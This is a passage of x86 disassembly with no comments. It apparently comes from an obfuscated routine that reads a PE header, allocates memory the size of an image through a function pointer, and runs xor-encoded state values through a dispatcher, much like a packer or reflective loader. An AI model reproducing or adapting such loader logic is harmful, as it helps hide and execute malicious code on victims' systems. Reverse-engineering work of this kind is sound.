  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
